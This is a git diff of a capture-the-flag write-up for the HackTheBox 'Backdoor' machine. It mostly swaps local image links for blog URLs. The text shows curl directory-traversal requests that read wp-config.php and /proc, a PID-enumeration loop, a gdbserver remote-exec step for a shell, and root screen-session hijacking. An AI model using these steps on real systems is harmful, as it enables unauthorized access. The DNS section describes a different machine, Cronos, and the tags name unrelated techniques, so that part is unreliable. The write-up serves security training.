@@ -1,4 +1,10 @@
-# Backdoor
+---
+title: "Backdoor - HTB"
+categories: [HackTheBox, Easy]
+tags: [Easy,Linux,AD,DNS,LDAP,Kerberos,AS-REP,RPC,DCSync]
+mermaid: true
+image: https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-Backdoor/Backdoor.png
+---
 
 # Introdution
 
@@ -26,7 +32,7 @@ First step is to enumerate the box. For this we’ll use `nmap`.
 ports=$(sudo nmap -p- -Pn --min-rate=1000 -T4 10.10.11.125 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) && sudo nmap -sC -sV -Pn -p $ports 10.10.11.125
 ```
 
-![Untitled](Backdoor%20a62d5d3f6b9b4da892b89aeedaeea28e/Untitled.png)
+![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-Backdoor/Untitled.png)
 
 ## Porta **53** (DNS) ****
 
@@ -38,7 +44,7 @@ For DNS enumeration, the first thing to do is try to resolve the Cronos IPs. I'l
 nslookup 10.10.10.13 10.10.10.13
 ```
 
-![Untitled](Backdoor%20a62d5d3f6b9b4da892b89aeedaeea28e/Untitled%201.png)
+![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-Backdoor/Untitled%201.png)
 
 We verify that the base domain is `cronos.htb`
 
@@ -48,11 +54,11 @@ Whenever there is TCP DNS, it is worth trying a zone transfer, which returns ano
 dig axfr @10.10.10.13 cronos.htb
 ```
 
-![Untitled](Backdoor%20a62d5d3f6b9b4da892b89aeedaeea28e/Untitled%202.png)
+![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-Backdoor/Untitled%202.png)
 
 Add the subdomain in */etc/hosts*
 
-![Untitled](Backdoor%20a62d5d3f6b9b4da892b89aeedaeea28e/Untitled%203.png)
+![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-Backdoor/Untitled%203.png)
 
 ---
 
@@ -64,7 +70,7 @@ I'll run a `gobuster` , but it will only return the three known ones:
 gobuster dns -d cronos.htb -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 100
 ```
 
-![Untitled](Backdoor%20a62d5d3f6b9b4da892b89aeedaeea28e/Untitled%204.png)
+![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-Backdoor/Untitled%204.png)
 
 ## **Porta 80 (http)**
 
@@ -72,7 +78,7 @@ We have checked an incomplete web page, which is called the domain `backdoor.htb
 
 `http://10.10.11.125/`
 
-![Untitled](Backdoor%20a62d5d3f6b9b4da892b89aeedaeea28e/Untitled%205.png)
+![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-Backdoor/Untitled%205.png)
 
 So we add the `backdoor.htb` domain to **/etc/hosts**.
 
@@ -114,11 +120,11 @@ We found a plugin, which is vulnerable to **Directory Traversal**.
 
 `http://10.10.11.125/wp-content/plugins/`
 
-![Untitled](Backdoor%20a62d5d3f6b9b4da892b89aeedaeea28e/Untitled%206.png)
+![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-Backdoor/Untitled%206.png)
 
 `https://www.exploit-db.com/exploits/39575`
 
-![Untitled](Backdoor%20a62d5d3f6b9b4da892b89aeedaeea28e/Untitled%207.png)
+![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-Backdoor/Untitled%207.png)
 
 We were able to download a configuration file with credentials.
 
@@ -126,7 +132,7 @@ We were able to download a configuration file with credentials.
 curl -s http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php
 ```
 
-![Untitled](Backdoor%20a62d5d3f6b9b4da892b89aeedaeea28e/Untitled%208.png)
+![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-Backdoor/Untitled%208.png)
 
 I tried logging in at `http://backdoor.htb/wp-login.php` but without success.
 
@@ -140,15 +146,15 @@ We will do a process enumeration (brute force PID).
 
 I can take a look at `/proc`, which has a directory for each process ID (pid) currently running. For example in my kali:
 
-![Untitled](Backdoor%20a62d5d3f6b9b4da892b89aeedaeea28e/Untitled%209.png)
+![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-Backdoor/Untitled%209.png)
 
 There's also the `self` directory, which is a symlink to the current process's pid. Again, in my kali:
 
-![Untitled](Backdoor%20a62d5d3f6b9b4da892b89aeedaeea28e/Untitled%2010.png)
+![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-Backdoor/Untitled%2010.png)
 
 In each listed directory, there is the `cmdline` file, which has the command line user to run the process:
 
-![Untitled](Backdoor%20a62d5d3f6b9b4da892b89aeedaeea28e/Untitled%2011.png)
+![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-Backdoor/Untitled%2011.png)
 
 On target I can do the same thing:
 
@@ -156,7 +162,7 @@ On target I can do the same thing:
 curl http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl**=**../../../../../../../proc/self/cmdline
 ```
 
-![Untitled](Backdoor%20a62d5d3f6b9b4da892b89aeedaeea28e/Untitled%2012.png)
+![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-Backdoor/Untitled%2012.png)
 
 However, curl does not allow to play binary data in the terminal. You will need to use `-o-` to force exit.
 
@@ -164,7 +170,7 @@ However, curl does not allow to play binary data in the terminal. You will need 
 curl -o- http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl**=**../../../../../../../proc/self/cmdline
 ```
 
-![Untitled](Backdoor%20a62d5d3f6b9b4da892b89aeedaeea28e/Untitled%2013.png)
+![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-Backdoor/Untitled%2013.png)
 
 Now let's clean up this output:
 
@@ -179,7 +185,7 @@ curl -o- -s http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.p
 `rev` Inverte a string
 > 
 
-![Untitled](Backdoor%20a62d5d3f6b9b4da892b89aeedaeea28e/Untitled%2014.png)
+![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-Backdoor/Untitled%2014.png)
 
 Now that the output is clean, we'll make a script that will change `self` to a PID from 1 to 2000 and show us the process running on each PID.
 
@@ -203,7 +209,7 @@ done
 
 This script will take a while to return what we want, but the result is this:
 
-![Untitled](Backdoor%20a62d5d3f6b9b4da892b89aeedaeea28e/Untitled%2015.png)
+![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-Backdoor/Untitled%2015.png)
 
 We see that `GDB Server` is running on port 1337 with **user** user in loop.
 
@@ -250,7 +256,7 @@ set remote exec-file /tmp/perverse.elf
 run
 ```
 
-![Untitled](Backdoor%20a62d5d3f6b9b4da892b89aeedaeea28e/Untitled%2016.png)
+![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-Backdoor/Untitled%2016.png)
 
 We managed to shell with the `user` user.
 
@@ -270,7 +276,7 @@ python3.8 -c "import pty; pty.spawn('/bin/bash')"
 
 Enumerating the existing processes, we see that something is running `screen` as root (in a loop) as root. This command checks the `/var/run/screen/S-root` directory every one second, if empty it creates a root session on screen.
 
-![Untitled](Backdoor%20a62d5d3f6b9b4da892b89aeedaeea28e/Untitled%2017.png)
+![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-Backdoor/Untitled%2017.png)
 
 > Screen is a terminal multiplexer tool, which allows the user to open multiple windows within one session and keep those windows running even when the user is not around or logged in (they will disappear on reboot).
 > 
@@ -281,7 +287,7 @@ We can see that there is a root session:
 ls -l /var/run/screen/
 ```
 
-![Untitled](Backdoor%20a62d5d3f6b9b4da892b89aeedaeea28e/Untitled%2018.png)
+![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-Backdoor/Untitled%2018.png)
 
 Here we cannot read the **S-root** directory.
 
@@ -289,7 +295,7 @@ Here we cannot read the **S-root** directory.
 screen -ls root/
 ```
 
-![Untitled](Backdoor%20a62d5d3f6b9b4da892b89aeedaeea28e/Untitled%2019.png)
+![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-Backdoor/Untitled%2019.png)
 
 To login to the session:
 
